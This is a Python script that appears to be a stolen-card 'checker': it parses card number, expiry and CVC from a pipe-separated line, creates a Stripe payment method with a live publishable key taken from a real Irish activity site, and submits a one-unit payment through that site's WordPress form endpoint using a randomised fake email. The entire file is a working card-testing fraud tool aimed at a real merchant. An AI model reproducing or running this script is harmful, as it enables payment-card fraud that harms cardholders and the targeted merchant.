import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa000efd06a%3B+stripe-js-v3%2Fa000efd06a%3B+card-element&referrer=https%3A%2F%2Factiveireland.ie&time_on_page=112534&client_attribution_metadata[client_session_id]=790d4eb9-0ff5-49fe-9af2-4d6d8e811291&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Ox9BQRo8oFsGvVkjXGXBOye95AlMqSFgAQ3HhWyqpuSigu6lkna9msPE2qvskTM0mxKue40VVXxfxu3Wq6HU6yQ00Yj2ztFrL'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    'g_state': '{"i_l":0,"i_ll":1774616752130,"i_b":"JXRA8nPSwYfn9gKDOrZrQsBx2kCNBR5felHTPMQuEYg","i_e":{"enable_itp_optimization":0}}',
	    '_ga': 'GA1.1.636707816.1774616754',
	    '_fbp': 'fb.1.1774616755373.870545280649172855',
	    'widget_load_key': 'c13b09bb-3378-4d85-bfe9-93ec5960b7a1',
	    'sib_cuid': '2621c935-6f4f-405f-995f-0c214c9670ae',
	    'FCCDCF': '%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%229e2d7798-caae-4dd7-bf67-d9e1b83a5ae5%5C%22%2C%5B1774616756%2C680000000%5D%5D%22%5D%5D%5D',
	    'FCNEC': '%5B%5B%22AKsRol88_oluFOK_wS8n9CloziWO1Xbyk4HCzPGXxPaoRMTI99IwTS9VmwKL9msv9nsXO-Ka6Dlf_Ogo27wyIRigTV1519M7tIdMWq3Uv7UxWi3lYJa83_qCyl9QRGtK6N6osKrgpnd6CKRrj2ROI50Mtyhg9CJWuA%3D%3D%22%5D%5D',
	    '__stripe_mid': '8d6bb8f5-26dc-41d0-bcbf-38d357c058d2c33e86',
	    '__stripe_sid': 'ddf977aa-cf51-4fb2-b93a-38b9efecc130363f3e',
	    '_ga_EL7248BB7H': 'GS2.1.s1774616753$o1$g1$t1774616819$j60$l0$h1829158869',
	    '_ga_D7K8ZN5SRL': 'GS2.1.s1774616754$o1$g1$t1774616865$j14$l0$h0',
	    '_gcl_au': '1.1.155287006.1774616753.1083220885.1774616866.1774616865',
	}
	
	headers = {
	    'authority': 'activeireland.ie',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'g_state={"i_l":0,"i_ll":1774616752130,"i_b":"JXRA8nPSwYfn9gKDOrZrQsBx2kCNBR5felHTPMQuEYg","i_e":{"enable_itp_optimization":0}}; _ga=GA1.1.636707816.1774616754; _fbp=fb.1.1774616755373.870545280649172855; widget_load_key=c13b09bb-3378-4d85-bfe9-93ec5960b7a1; sib_cuid=2621c935-6f4f-405f-995f-0c214c9670ae; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%229e2d7798-caae-4dd7-bf67-d9e1b83a5ae5%5C%22%2C%5B1774616756%2C680000000%5D%5D%22%5D%5D%5D; FCNEC=%5B%5B%22AKsRol88_oluFOK_wS8n9CloziWO1Xbyk4HCzPGXxPaoRMTI99IwTS9VmwKL9msv9nsXO-Ka6Dlf_Ogo27wyIRigTV1519M7tIdMWq3Uv7UxWi3lYJa83_qCyl9QRGtK6N6osKrgpnd6CKRrj2ROI50Mtyhg9CJWuA%3D%3D%22%5D%5D; __stripe_mid=8d6bb8f5-26dc-41d0-bcbf-38d357c058d2c33e86; __stripe_sid=ddf977aa-cf51-4fb2-b93a-38b9efecc130363f3e; _ga_EL7248BB7H=GS2.1.s1774616753$o1$g1$t1774616819$j60$l0$h1829158869; _ga_D7K8ZN5SRL=GS2.1.s1774616754$o1$g1$t1774616865$j14$l0$h0; _gcl_au=1.1.155287006.1774616753.1083220885.1774616866.1774616865',
	    'origin': 'https://activeireland.ie',
	    'referer': 'https://activeireland.ie/active-summer-week-4-july-20th-july-24th-2026/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1774616872921',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=17165&_fluentform_28_fluentformnonce=303fd51d06&_wp_http_referer=%2Factive-summer-week-4-july-20th-july-24th-2026%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser{random3}%40gmail.com&phone=%2B14303000850&dropdown_3=Facebook&input_radio=1&names_1%5Bfirst_name%5D=Yell&names_1%5Blast_name%5D=&dropdown=12&input_text=None&checkbox%5B%5D=No&input_radio_1=8&input_text_1=None&terms-n-condition_1=on&gdpr-agreement=on&custom-payment-amount=1&payment_method=stripe&terms-n-condition=&terms-n-condition_3=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '28',
	}
	
	response = requests.post(
	    'https://activeireland.ie/wp-admin/admin-ajax.php',
	    params=params,
	    #cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
